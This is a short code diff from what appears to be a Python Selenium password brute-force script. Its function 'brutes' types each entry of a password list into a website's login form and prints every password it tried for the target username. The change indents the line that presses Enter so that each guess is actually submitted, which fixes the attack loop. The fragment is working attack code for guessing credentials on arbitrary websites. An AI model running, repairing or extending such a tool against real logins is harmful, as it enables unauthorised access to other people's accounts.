@@ -93,7 +93,7 @@ def brutes(username, username_selector, password_selector, pass_list, website):
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
                 t.sleep(1)
-        Sel_pas.send_keys(u'\ue007')
+                Sel_pas.send_keys(u'\ue007')
                 t.sleep(2)
                 print '------------------------'
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
